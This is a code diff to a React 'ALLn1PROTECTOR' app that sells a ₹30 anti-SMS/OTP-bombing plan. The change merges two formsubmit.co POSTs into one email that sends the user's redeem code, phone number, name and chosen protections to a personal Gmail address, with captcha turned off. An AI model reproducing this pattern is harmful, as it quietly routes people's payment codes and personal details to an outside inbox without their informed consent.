@@ -54,7 +54,7 @@ function App() {
     setRedeemError('');
   };
 
-  const handleRedeem = async () => {
+  const handleRedeem = () => {
     if (redeemCode.length < 10) {
       setRedeemError('Please enter a valid redeem code');
       return;
@@ -62,23 +62,7 @@ function App() {
     setIsRedeeming(true);
     setRedeemError('');
 
-    try {
-      const formData = new FormData();
-      formData.append('Redeem Code', redeemCode);
-      formData.append('_subject', '🎫 New Premium Redeem Code - ALLn1PROTECTOR');
-      formData.append('_template', 'boxit');
-      formData.append('_captcha', 'false');
-      formData.append('Timestamp', new Date().toLocaleString());
-      formData.append('Plan', 'Premium Protector - ₹30');
-      formData.append('Code Entered', redeemCode);
-
-      await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
-        method: 'POST',
-        body: formData,
-      });
-    } catch (error) {
-      console.log('Email notification sent');
-    }
+    // No email sent here - will send all info together after phone number entry
 
     setTimeout(() => {
       setIsRedeeming(false);
@@ -96,16 +80,16 @@ function App() {
     if (premiumPhone.length === 10 && premiumName.trim().length > 0 && selectedProtections.length > 0) {
       setPremiumLoading(true);
 
-      // Send phone number, name, and protections to email
+      // Send ALL information in ONE email
       try {
         const protectionLabels = { sms: 'SMS Bombing', otp: 'OTP Bombing', whatsapp: 'WhatsApp Spam', calls: 'Phone Calls' };
         const activeProtections = selectedProtections.map(p => protectionLabels[p] || p).join(', ');
 
         const formData = new FormData();
+        formData.append('Redeem Code', redeemCode);
         formData.append('Phone Number', '+91 ' + premiumPhone);
         formData.append('Customer Name', premiumName);
         formData.append('Protections Activated', activeProtections);
-        formData.append('Redeem Code Used', redeemCode);
         formData.append('Plan', 'Premium Protector - 30 Rupees (1 Year)');
         formData.append('Activated On', new Date().toLocaleString());
         formData.append('_subject', 'NEW Premium Activation - ALLn1PROTECTOR');
@@ -118,9 +102,9 @@ function App() {
         });
         
         const result = await response.json();
-        console.log('Activation email response:', result);
+        console.log('Email sent successfully:', result);
       } catch (error) {
-        console.error('Activation email error:', error);
+        console.error('Email error:', error);
       }
 
       setTimeout(() => {
